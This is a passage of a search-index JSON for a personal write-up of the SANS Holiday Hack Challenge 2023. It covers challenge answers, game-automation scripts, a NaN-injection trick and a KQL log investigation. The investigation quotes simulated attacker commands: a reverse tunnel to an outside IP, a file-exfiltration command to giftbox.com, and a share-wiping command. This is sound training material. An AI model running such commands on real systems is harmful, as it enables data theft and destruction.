{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":"<p> (The title image is generated by DALL-E with prompt: \"Could you please create me a cheerful picture of SANS Holiday Hack Challenge 2023 KringleCon? In the picture, we will have elements of Santa, Elfs, one evil elf lurking, geese and hacker gadgets.\")</p>"},{"location":"#introduction","title":"Introduction","text":"<p>Welcome to my SANS Holiday Hack 2023 write-up. This is the first time I have played KringleCon. I am very delighted to have completed the Holiday Hack Challenge just two days before Christmas Eve. Now you can sit back and enjoy the storyline of this holiday season and save Christmas from the baddies. </p> <p>The challenges have been divided into six islands. Most of the challenges you can complete on your own. For some challenges, there is a prerequisite. For example, in order to complete the Camera Access, you would need to complete Active Directory and Certificate SSHenanigans first. If you talk to every single elf on each island, you will gather all the hints you need and have objectives unlocked. Remember to talk to the elf who issued you the objective after you complete it. They may give you guidance on the follow-up challenges. Besides the main challenges, there are two bonus challenges: fishing and boat racing Easter eggs and Jason. You also want to keep your eyes out for the three game boy cartridges spread along 3 islands! </p> <p>In some challenges (Camera Access, Fishing Mastery), I have provided custom scripts to automate the process. These scripts were generated using precise AI prompts. However, you should always validate the codes AI provides, as I have more than once found that AI can give incorrect parameters, akin to a minefield. If I execute them without reviewing and correcting the code, I would end up not achieving the desired results. </p> <p>The first objective \"Holiday Hack Orientation\" you can complete it by talk to \"Jingle Ringford\" on Christmas Island and get your bearings at Geese Islands. </p> <p>100-page submission limit</p> <p>Each year there's a huge number of write-ups that need to be reviewed by the Counter Hack team. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information.</p> Navigation tip <p>Even with less than 100 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p> <p></p>"},{"location":"#answers","title":"Answers","text":"<p>1. Holiday Hack Orientation - </p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands.</p> <p>2. Snowball Fight - </p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa! Click</p> <p>3. Linux 101 - </p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach. Click.</p> <p>4. Reportinator - </p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up. Click.</p> <p>5. Azure 101 - </p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island. Click.</p> <p>6. Luggage Lock - </p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials Click.</p> <p>7. Linux PrivEsc - </p> <p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands. Click.</p> <p>8. Game Cartridges: Vol 1 - </p> <p>Find the first Gamegosling cartridge and beat the game Click.</p> <p>9. Hashcat - </p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it! Click.</p> <p>10. Na'an - </p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win! Click.</p> <p>11. KQL Kraken Hunt - </p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information. https://detective.kusto.io/sans2023 Click.</p> <p>12. Phish Detection Agency - </p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad! Click.</p> <p>13. Elf Hunt - </p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points. Click.</p> <p>14. Game Cartridges Vol 2 - </p> <p>Find the second Gamegosling cartridge and beat the game Click.</p> <p>15. Certificate SSHenanigans - </p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement? https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl Click.</p> <p>16. Faster Lock Combination - </p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it! Click.</p> <p>17. Game Cartridges Vol 3 - </p> <p>Find the third Gamegosling cartridge and beat the game Click.</p> <p>18. The Captain's Comms - </p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role. Click.</p> <p>19. Active Directory - </p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare? Click.</p> <p>20. Space Island Door Access Speaker - </p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information. Click.</p> <p>21. Camera Access - </p> <p>Gain access to Jack's camera. What's the third item on Jack's TODO list? Click.</p> <p>22. Missile Diversion - </p> <p>Thwart Jack's evil plan by re-aiming his missile at the Sun. Click here.</p> <p>23. BONUS! Fishing Mastery - </p> <p>Catch twenty different species of fish that live around Geese Islands. When you're done, report your findings to Poinsettia McMittens on the Island of Misfit Toys. Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens. Click here.</p>"},{"location":"#response","title":"Response","text":"Santa <p>You've done it! You've saved me and my sleigh from Jack Frost's dastardly plan!</p> <p>I must admit, it's astonishing the lengths Jack will go to in order to try and stop the holiday season.</p> <p>Even after being banished from Earth, he managed to create an AI to social engineer us into moving our holiday operations to the Geese Islands, putting us right in the path of his satellite. </p> <p>And to think he even recruited one of my dear elves... I never saw that coming. Oh, Wombley...</p> <p>But thanks to your incredible efforts, we've proof that Jack violated his parole, and the chances of him interfering with the holidays ever again are all but impossible! </p> <p>I can't thank you enough for your help in protecting the magic and joy of this special time of year.</p> <p>I have prepared you some special swags only for winner. You can claim them from this shop </p> <p>I'd like to wish you a most wonderful holiday season, no matter where you may be on Earth or what the weather is like. </p> <p>Keep that holiday spirit alive, my friend, and remember: a little change now and then can lead to something magical!</p> <p>Ho ho ho, happy holidays! </p> Jack Frost <p>Okay, listen up, yes I've been caught, but let me tell you, my plan was incredible, I mean really incredible.</p> <p>I and the trolls created ChatNPT, a fantastic AI, and left it behind in the North Pole in 2021 to trick Santa into moving to the Geese Islands. It worked like a charm, perfectly perfect.</p> <p>My satellite was geostationary, right over the islands to maintain comms with ChatNPT, and Wombley in the gound station. It was genius. Absolute genius, really.</p> <p>I was reviewing all the prompts as they were sent, and changing the responses in real time thanks to Santa's operation moving to the Geese Islands. This was very smart. Very, very, very smart, very efficient.</p> <p>And Wombley, the elf, joining me? Easy. He was so easy to convince.</p> <p>You see, there's a big, big dissent in Santa's ranks, huge.</p> <p>The elves, they're not happy with Santa.</p> <p>Mark my words, even if I don't stop Santa, his own elves will.</p> <p>It's going to be tremendous, this you will see.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Now you have saved Christmas from the \"bad guy\"'s evil plan, enjoy the holiday!</p> <p>Narrative</p> <p>Just sit right back and you\u2019ll hear a tale,  A tale of a yuletide trip  That started from a tropic port,  Aboard this tiny ship  Santa and his helpful elves  To Geese Islands did go  Continuing their merry work  O'er sand instead of snow  New this year: a shiny tool  The elves logged in with glee  What makes short work of many tasks?  It's ChatNPT. It's ChatNPT  From images to APIs  This AI made elves glad  But motivations were unknown  So was it good or bad?  Could it be that NPT  Was not from off-the-shelf?  Though we'll forgive and trust again  We'd found a naughty elf  This fancy AI tool of ours  With all our work remained  Not good or bad, our online friend  Just did as it was trained  Surely someone's taint must be  Upon our AI crutch  Yes indeed, this bold new world  Bore Jack Frost's icy touch Though all's returned to steady state There's one thing that we know We'll all be needed once again. </p> <p></p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":""},{"location":"easter_eggs/#bonus-fishing-guide-and-mastery","title":"BONUS! Fishing Guide and Mastery","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"easter_eggs/#objective","title":"Objective","text":"<p>Request</p> <p>Catch twenty different species of fish that live around Geese Islands. When you're done, report your findings to Poinsettia McMittens on the Island of Misfit Toys.</p> <p>Request</p> <p>Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens.</p> Poinsettia McMittens <p>Excuse me, but you're interrupting my fishing serenity. Oh, you'd like to know how to become as good at fishing as I am? Well, first of all, thank you for noticing my flair for fishing. It's not just about looking good beside the lake, you know. The key is in the details, much like crafting the perfect toy. Observe the water, the weather, and the fish\u2019s habits - it's a science and an art. Of course, it helps to have a natural charm. Fish seem to find me irresistible. Must be my sparkling personality... or maybe it's just the glitter of my allure. Oh, the mysteries of the aquatic life around these islands are as elusive as, well, a clever compliment. But you'll get one if you probe enough. Remember, patience is more than a virtue in fishing; it\u2019s a strategy. Like waiting for the right time to use flattery, you wait for the right moment to strike. Go see if you can catch, say, 20 different types of fish!</p>"},{"location":"easter_eggs/#hints","title":"Hints","text":"Become the Fish <p>Perhaps there are some clues about the local aquatic life located in the HTML source code.</p> I Am Become Data <p>One approach to automating web tasks entails the browser's developer console. Browsers' console allow us to manipulate objects, inspect code, and even interact with websockets.</p> Fishing Machine <p>There are a variety of strategies for automating repetative website tasks. Tools such as AutoKey and AutoIt allow you to programmatically examine elements on the screen and emulate user inputs.</p>"},{"location":"easter_eggs/#solution","title":"Solution","text":"<p>Well, first thing first, where is Jason? </p> <p></p> Jason <p>Hi, I'm Jason! I'm not dead.  I'm just soaking up the sun's gnarly vibes, bro!</p> <p>User your \"three\" buttons (Cast Line --&gt; Reel it in --&gt; Reel it in turn red --&gt; Reel it in) to manually fishing 20 fishes, and report back to Poinsettia McMittens to get your  fishing mastery challenge! </p> <p>First open the developer tool, we can find: </p> <p><code>&lt;!-- &lt;a href='fishdensityref.html'&gt;[DEV ONLY] Fish Density Reference&lt;/a&gt; --&gt;&lt;div class=\"overlay\"&gt;&lt;/div&gt;</code></p> <p>We can either replace the minimap with heatmap in js or get the heat map using wget and do our job offline. </p> <p><code>wget -r -np -k https://2023.holidayhackchallenge.com/sea/fishdensityref.html</code></p> <p>Python script that overlay all the heat maps: </p> Python Code<pre><code>import sys\nfrom PIL import Image\nimport os\n\ndef overlay_images(input_directory, output_directory):\n    # List all PNG files in the input directory\n    files = [f for f in os.listdir(input_directory) if f.endswith('.png')]\n\n    # Initialize a variable to hold the composite image\n    composite = None\n\n    # Loop through the files and overlay them\n    for file in files:\n        path = os.path.join(input_directory, file)\n        image = Image.open(path).convert(\"RGBA\")\n\n        if composite is None:\n            # First image sets the size\n            composite = Image.new(\"RGBA\", image.size)\n\n        # Overlay the image\n        composite = Image.alpha_composite(composite, image)\n\n    # Create output directory if it doesn't exist\n    if not os.path.exists(output_directory):\n        os.makedirs(output_directory)\n\n    # Save the final composite image\n    output_path = os.path.join(output_directory, 'composite.png')\n    composite.save(output_path, 'PNG')\n    return output_path\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print(\"Usage: python script.py input_directory_path output_directory_path\")\n        sys.exit(1)\n\n    input_directory = sys.argv[1]\n    output_directory = sys.argv[2]\n\n    composite_image_path = overlay_images(input_directory, output_directory)\n    print(\"Composite image saved as:\", composite_image_path)\n</code></pre> <p>Heat maps with brighter spots are the places you want to catch a particular fish. If you overlay two maps together, the bright spots remain are the places where you can catch both types of fish. </p> <p>We get the one fish: </p> <p></p> <p>The fish habitats! The maps below are overlay of all 171 heat maps for 171 fishes.  </p> <p> </p> <p>You will observe on pic with only one bright spot, that is THE ONE fish: Piscis Cyberneticus Skodo. We can navigate our ship to the correct bright spot to fishing using this overlayed minimap. </p> <p>We then copy and paste the Java script under /sea directory in developer tool to your favourite AI bot, then I used the following prompt: </p> <p><code>Based on my Java script code I sent to you, I need you to write a client side script by utilising Java web socket to send message that check castReelBtn is visible 5 times per second. If it is visible, click it and then wait for the reelItInBtn button to turn red (which appears be a class applied to that button), once it turns red, click it immediately. Then check openpescadexBtn and see if we got a fish, if yes, output success message to console. Then back to castReelBtn and repeat this process.</code></p> JS Code to auto fishing<pre><code>// Function to check if an element is visible\nfunction isVisible(element) {\n    return element &amp;&amp; element.style.display !== 'none';\n}\n\n// Function to check if reelItInBtn turned red\nfunction isReelButtonRed() {\n    return reelItInBtn.classList.contains('gotone');\n}\n\n// Function to check and log the caught fish\nfunction checkAndLogFish() {\n    if (isVisible(openpescadexBtn)) {\n        openpescadexBtn.click(); // Open the Pescadex\n\n        // Assuming fish name is stored in some element after opening Pescadex\n        // Replace 'fishNameElement' with the correct identifier for your application\n        const fishNameElement = document.querySelector('selector-for-fish-name'); \n        if (fishNameElement) {\n            console.log(`Success! Caught a ${fishNameElement.textContent}`);\n        }\n\n        // Continue with the fishing process\n        setTimeout(autoFish, 500); // Adjust delay as needed\n    }\n}\n\n// Function to perform the fishing action\nfunction autoFish() {\n    if (isVisible(castReelBtn)) {\n        castReelBtn.click(); // Click the cast reel button\n\n        // Wait for the reelItInBtn to turn red\n        const reelInterval = setInterval(() =&gt; {\n            if (isReelButtonRed()) {\n                clearInterval(reelInterval);\n                reelItInBtn.click(); // Click the reel in button\n\n                // Check for caught fish\n                setTimeout(checkAndLogFish, 1000); // Adjust delay as needed\n            }\n        }, 200); // Check for the red button 5 times per second\n    }\n}\n\n// Start the auto fishing process\nautoFish();\n</code></pre> <p>Run the script on your developer console and your fishing crew will fishing for you for free! To track what we had in our bucket, use the following Java code: </p> JS Code to downlaod fish list<pre><code>function downloadFishNames() {\n    if (!playerData || !Array.isArray(playerData.fishCaught)) {\n        alert(\"No fish data available.\");\n        return;\n    }\n\n    // Include the fish's name and hash in the output\n    let fishNames = playerData.fishCaught.map(fish =&gt; `${fish.name} - ${fish.hash}`).join('\\n');\n    let blob = new Blob([fishNames], { type: 'text/plain' });\n    let url = window.URL.createObjectURL(blob);\n\n    let a = document.createElement('a');\n    a.href = url;\n    a.download = 'fish-names.txt';\n    a.style.display = 'none';\n    document.body.appendChild(a);\n    a.click();\n    window.URL.revokeObjectURL(url);\n    document.body.removeChild(a);\n}\n\n// Call this function to prompt the user to download the file\ndownloadFishNames();\n</code></pre> <p>Once you completed the challenges, you can download every fish picture using the code below in web console: </p> JS Code to download all fish pics<pre><code>function downloadFishImages() {\n    if (!playerData || !Array.isArray(playerData.fishCaught)) {\n        alert(\"No fish data available.\");\n        return;\n    }\n\n    playerData.fishCaught.forEach(fish =&gt; {\n        const imageUrl = `assets/fish/${fish.hash}.png`;\n        const a = document.createElement('a');\n        a.href = imageUrl;\n        a.download = `${fish.name}.png`;\n        document.body.appendChild(a);\n        a.click();\n        document.body.removeChild(a);\n    });\n}\n\ndownloadFishImages();\n</code></pre> <p>Isn't it nice to have all the fishes in your bucket?</p>"},{"location":"easter_eggs/#images","title":"Images","text":"<p>Answer</p> <p>170 fishes plus a special one!  </p>"},{"location":"easter_eggs/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>Hoy small fry, nice work!</p> <p>Now, just imagine if we had an automatic fish catcher? It would be as ingenious as me on a good day!</p> <p>I came across this fascinating article about such a device in a magazine during one of my more glamorous fishing sessions.</p> <p>If only I could get my hands on it, I'd be the undisputed queen of catching them all!</p> <p>You managed to catch every fish? You're like the fishing version of a Christmas miracle!</p> <p>Now, if only you could teach me your ways... but then again, I'm already pretty fabulous at everything I do.</p>"},{"location":"objectives/o1/","title":"KringleCon Orientation","text":"<p>Difficulty:  Direct link: Objective 1 terminal</p>"},{"location":"objectives/o1/#objective","title":"Objective","text":"<p>Request</p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands</p> Jingle Ringford <p>Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge! I'm Jingle Ringford, one of Santa's many elves. Santa asked me to meet you here and give you a short orientation to this festive event. Before you head back to your boat, I'll ask you to accomplish a few simple tasks. First things first, here's your badge! It's that starfish in the middle of your avatar. Great - now you're official! Click on the badge on your avatar. That's where you will see your Objectives, Hints, and Conversations for the Holiday Hack Challenge. We've also got handy links to some awesome talks and more there for you! Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions.</p>"},{"location":"objectives/o1/#hints","title":"Hints","text":"N/A <p>N/A</p>"},{"location":"objectives/o1/#solution","title":"Solution","text":"<p>Just left click the elf. </p>"},{"location":"objectives/o1/#images","title":"Images","text":""},{"location":"objectives/o1/#diagrams","title":"Diagrams","text":"<p>Answer</p> <p>N/A</p>"},{"location":"objectives/o1/#response","title":"Response","text":"<p>Jingle Ringforde</p> <p>Perfect! Your orientation is now complete! Head back to your boat or click on the anchor icon on the left of the screen to set sail for Frosty's Beach where Santa's waiting for you. I've updated your boat's compass to guide the way. As you sail to each island, talk to the goose of that island to receive a colorful lei festooning the masts on your ship. Safe travels my friend and remember, relax, enjoy the sun, and most importantly, have FUN!</p>"},{"location":"objectives/o10/","title":"Na'an","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Request</p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> Shifty McShuffles (Chiaroscuro City) <p>Hey there, stranger! Fancy a game of cards? Luck's on your side today, I can feel it.</p> <p>Step right up, test your wit! These cards could be your ticket to fortune.</p> <p>Trust me, I've got a good eye for winners, and you've got the look of luck about you.</p> <p>Plus, I'd wager you've never played this game before, as this isn't any ordinary deck of cards. It's made with Python.</p> <p>The name of the game is to bamboozle the dealer.</p> <p>So whad'ya think? Are you clever enough? </p>"},{"location":"objectives/o10/#hints","title":"Hints","text":"Stump the Chump <p>Try to outsmart Shifty by sending him an error he may not understand.</p> The Upper Hand <p>Shifty said his deck of cards is made with Python. Surely there's a weakness to give you the upper hand in his game.</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":"<p>Check this article out: </p> <p><code>https://www.tenable.com/blog/python-nan-injection</code></p> <p>If we open the developer tool, under <code>nannannannannannan.com/js/game.js</code>, we can observe the card play's Java code. </p> <p>The aim of this challenge is to win the card game, you need to pick 5 unique cards numbering from 0-9. Whoever picks the lowesr and highest numbers gets a point for each. Same numbers canceled out. First on to 10 points wins. The trick here is put to NAN number in the first place, then 0, 9, as you like. The NAN will be picked up first. </p> <p></p> <p>Another way to win this is to use Burp to change the parameters like so: </p> <p></p> <p>You can see from above pic that the maximum card and minimum card numbers are both NAN.</p> <p>You can change all the numbers in your code to NAN by Burp intercept, which esentially bypassed the rule of unique number - you can't choose one number for two cards in one round. NaN is a special \"number\" in Python that essentially changes every other number it encountered. </p> <p>The server is using Python to host this game, interesting...</p> <p>Answer</p> <p>NAN</p>"},{"location":"objectives/o10/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Well, you sure are more clever than most of the tourists that show up here. I couldn't swindle ya, but don't go telling everyone how you beat me! An elf's gotta put food on the table somehow, and I'm doing the best I can with what I got.</p>"},{"location":"objectives/o11/","title":"KQL Kraken Hunt","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o11/#objective","title":"Objective","text":"<p>Request</p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.</p> Tangle Coalbox (Gumshoe Alley PI Office) <p>Greetings, rookie. Tangle Coalbox of Kusto Detective Agency here.</p> <p>I've got a network infection case on Film Noir Island that needs your expertise.</p> <p>Seems like someone clicked a phishing link within a client's organization, and trouble's brewing.</p> <p>I'm swamped with cases, so I need an extra pair of hands. You up for the challenge?</p> <p>You'll be utilizing the Azure Data Explorer and those KQL skills of yours to investigate this incident.</p> <p>Before you start, you'll need to create a free cluster.</p> <p>Keep your eyes peeled for suspicious activity, IP addresses, and patterns that'll help us crack this case wide open.</p> <p>Remember, kid, time is of the essence. The sooner we can resolve this issue, the better.</p> <p>If you run into any problems, just give me a holler, I've got your back.</p> <p>Good hunting, and let's bring this cyber criminal to justice.</p> <p>Once you've got the intel we need, report back and we'll plan our next move. Stay sharp, rookie.</p>"},{"location":"objectives/o11/#hints","title":"Hints","text":"Outbound Connections <p>Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!</p> KQL Tutorial <p>Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.</p> File Creation <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p> File Creation <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p>"},{"location":"objectives/o11/#solution","title":"Solution","text":"<p>Your need to play this game at: </p> <p>https://detective.kusto.io/sans2023</p>"},{"location":"objectives/o11/#case-0","title":"Case 0:","text":"<pre><code>| where role has \"Craftsperson Elf\"\n| where hostname has \"LAPTOP\"\n| count \n</code></pre>"},{"location":"objectives/o11/#case-1","title":"Case 1:","text":""},{"location":"objectives/o11/#question-1","title":"Question 1","text":"<p>Question</p> <p>What is the email address of the employee who received this phishing email?</p> <p>alabaster_snowball@santaworkshopgeeseislands.org</p> <p>What is the email address that was used to send this spear phishing email?</p> <p>cwombley@gmail.com</p> <p>What was the subject line used in the spear phishing email?</p> <p>[EXTERNAL] Invoice foir reindeer food past due</p> <pre><code>Timestamp: \n2023-12-02T09:37:40Z\n\nalabaster_snowball@santaworkshopgeeseislands.org\n\ncwombley@gmail.com\n\n[EXTERNAL] Invoice foir reindeer food past due\n\nHire_date: 2021-06-09T06:59:43Z\n\nUser_agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko\n\nCompany_domain: santaworkshopgeeseislands.org\n\nUsername: alsnowball\n\nrole: Head Elf\n\nhostname: Y1US-DESKTOP\n\nIp_addr = 10.10.0.4\n</code></pre>"},{"location":"objectives/o11/#case-2","title":"Case 2:","text":""},{"location":"objectives/o11/#question-2","title":"Question 2","text":"<p>Question</p> <p>What is the role of our victim in the organization?</p> <p>Head Elf</p> <p>What is the hostname of the victim's machine?</p> <p>Y1US-DESKTOP</p> <p>What is the source IP linked to the victim?</p> <p>10.10.0.4</p>"},{"location":"objectives/o11/#case-3","title":"Case 3:","text":""},{"location":"objectives/o11/#question-3","title":"Question 3","text":"<p>Question</p> <p>What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!</p> <p>2023-12-02T10:12:42Z</p> <p>What file is dropped to Alabaster's machine shortly after he downloads the malicious file?</p> <p>giftwrap.exe</p> <pre><code>SecurityAlerts\n| project indicators\n</code></pre> <pre><code>OutboundNetworkEvents\n| where src_ip == \"10.10.0.4\"\n| where url has \".docx\"\n\n\n\"timestamp\": 2023-12-02T10:12:42Z,\n\"method\": GET,\n\"src_ip\": 10.10.0.4,\n\"user_agent\": Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko,\n\"url\": http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx\n\n\nFileCreationEvents\n| where hostname has \"Y1US-DESKTOP\"\n| where path has \".docx\"\n\n\n\"timestamp\": 2023-12-02T10:13:35Z,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball,\n\"sha256\": 9cec01b76ec24175cde5482b4c0b09fa4278b8e06a267186888853207adc3ced,\n\"path\": C:\\Users\\alsnowball\\Downloads\\MonthlyInvoiceForReindeerFood.docx,\n\"filename\": MonthlyInvoiceForReindeerFood.docx,\n\"process_name\": Edge.exe\n\n\nFileCreationEvents\n| where hostname has \"Y1US-DESKTOP\"\n| where timestamp &gt; datetime(2023-12-02T10:12:42Z)\n\n\n\"timestamp\": 2023-12-02T10:14:21Z,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball,\n\"sha256\": 4c199019661ef7ef79023e2c960617ec9a2f275ad578b1b1a027adb201c165f3,\n\"path\": C:\\ProgramData\\Windows\\Jolly\\giftwrap.exe,\n\"filename\": giftwrap.exe,\n\"process_name\": explorer.exe\n</code></pre>"},{"location":"objectives/o11/#case-4","title":"Case 4:","text":""},{"location":"objectives/o11/#question-4","title":"Question 4","text":"<p>Question</p> <p>The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?</p> <p>113.37.9.17</p> <p>What is the timestamp when the attackers enumerated network shares on the machine?</p> <p>2023-12-02T16:51:44Z</p> <p>What was the hostname of the system the attacker moved laterally to?</p> <p>NorthPolefileshare</p> <pre><code>ProcessEvents\n| where hostname == \"Y1US-DESKTOP\" and process_commandline contains \"forward\"\n\n\"timestamp\": 2023-12-02T11:11:29Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": \"ligolo\" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof,\n\"process_name\": ligolo,\n\"process_hash\": e9b34c42e29a349620a1490574b87865cc1571f65aa376b928701a034e6b3533,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n\nProcessEvents\n| where hostname == \"Y1US-DESKTOP\" and process_commandline ==\"net share\"\n\n\"timestamp\": 2023-12-02T16:51:44Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": net share,\n\"process_name\": net.exe,\n\"process_hash\": 8b5b1556ba468035a37b40d8ea42a4bff252f4502b97c52fcacb3ba269527a57,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n\n\nInboundNetworkEvents\n| where src_ip has \"113.37.9.17\"\n\n\"timestamp\": 2023-12-02T11:29:55Z,\n\"method\": GET,\n\"src_ip\": 113.37.9.17,\n\"user_agent\": Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/5.1),\n\"url\": https://santaworkshopgeeseislands.org/search=santa+clauce+naughty+nice+list\n\n\nPassiveDns\n| where ip has \"113.37.9.17\"\n\n\"timestamp\": 2023-11-26T19:17:25Z,\n\"ip\": 113.37.9.17,\n\"domain\": madelvesnorthpole.org\n\n\n\n\nProcessEvents\n| where timestamp &gt; datetime(2023-12-02T16:51:44Z)\n| where process_commandline has \"net\"\n\n\n\"timestamp\": 2023-12-24T15:14:25Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": cmd.exe /C net use \\\\NorthPolefileshare\\c$ /user:admin AdminPass123,\n\"process_name\": cmd.exe,\n\"process_hash\": bfc3e1967ffe2b1e6752165a94f7f84a216300711034b2c64b1e440a54e91793,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n\n\n\n\nProcessEvents\n| where timestamp &gt; datetime(2023-12-02T14:26:11Z)\n| where username == \"alsnowball\" \n\n\nProcessEvents\n| where process_name has \"net.exe\"\n</code></pre>"},{"location":"objectives/o11/#case-5","title":"Case 5:","text":""},{"location":"objectives/o11/#question-5","title":"Question 5","text":"<p>Question</p> <p>When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?</p> <p>powershell.exe -c Copy-Item \\NorthPolefileshare\\c$\\MissionCritical\\NaughtyNiceList.txt C:\\Desktop\\NaughtyNiceList.txt</p> <p>What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)</p> <p>NaughtyNiceList.txt </p> <p>The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?</p> <p>giftbox.com</p> <pre><code>Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&amp;ccm&amp;]clientsdk | Out-Null\n\npowershell.exe -c Copy-Item \\\\NorthPolefileshare\\c$\\MissionCritical\\NaughtyNiceList.txt C:\\Desktop\\NaughtyNiceList.txt\n\ndownwithsanta.exe -exfil C:\\\\Desktop\\\\NaughtNiceList.docx \\\\giftbox.com\\\\file\n\nC:\\Windows\\System32\\downwithsanta.exe --wipeall \\\\\\\\NorthPolefileshare\\\\c$\n\nProcessEvents\n| where hostname contains \"Y1US-DESKTOP\"\n| where process_commandline has \"powershell.exe\"\n</code></pre>"},{"location":"objectives/o11/#case-6","title":"Case 6:","text":"<p>Wow! You decoded those secret messages with easy! You're a rockstar. It seems like we're getting near the end of this investigation, but we need your help with one more thing...</p> <p>We know that the attackers stole Santa's naughty or nice list. What else happened? Can you find the final malicious command the attacker ran?</p>"},{"location":"objectives/o11/#question-6","title":"Question 6","text":"<p>Question</p> <p>What is the name of the executable the attackers used in the final malicious command?</p> <p>downwithsanta.exe</p> <p>What was the command line flag used alongside this executable?</p> <p>C:\\Windows\\System32\\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$</p> <p>Congrats! You are now a fully qualified Principal Detective! </p>"},{"location":"objectives/o11/#images","title":"Images","text":""},{"location":"objectives/o11/#response","title":"Response","text":"KQL Server <p>Congratulations, Ace Detective! You've successfully navigated the treacherous waters of deception and emerged victorious. Your sharp wits and keen eye for detail have cracked the case wide open, proving that even the most cunning phishing attempts are no match for your discerning mind. In a world where shadows often obscure the truth, you shone a bright light on duplicity. Your unwavering commitment to truth and justice in the digital realm has kept our virtual streets safe. Thanks to your efforts, the Phishing Detection Agency stands strong, a bulwark against the tide of digital deceit. Remember, the battle against phishing is ongoing, but with sleuths like you on the case, the internet remains a safer place.  You're not just a hero; you're a guardian of the digital frontier. So here's to you, the quintessential cyber sleuth, a beacon of hope in these pixelated alleyways of misinformation. Your achievement is not just a personal victory; it's a triumph for all of us in the agency.</p> <p>Tangle Coalbox (Gumshoe Alley PI Office)</p> <p>I had my doubts, but you've proven your worth.</p> <p>That phishing scheme 